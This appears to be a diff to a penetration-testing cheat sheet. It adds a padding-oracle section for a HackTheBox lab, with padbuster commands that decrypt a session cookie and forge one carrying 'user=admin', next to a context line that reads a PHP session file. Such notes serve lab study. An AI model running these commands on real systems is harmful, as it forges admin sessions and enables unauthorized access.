@@ -37,6 +37,21 @@ HTTP also provides mechanisms to authenticate users. There are three methods ava
     Note : Debian Php stores cookies at:
     # cat /var/lib/php5/sess_o8d7lr4p16d9gec7ofkdbnhm93
 ````
+### Padding Oracle
+
+- https://pentesterlab.com/exercises/padding_oracle/course
+- HTB - Lazy
+
+Decrypt
+```
+# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 
+```
+
+Encrypt
+```
+# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 -plaintext user=admin
+```
+
 
 ### Escape
 ````
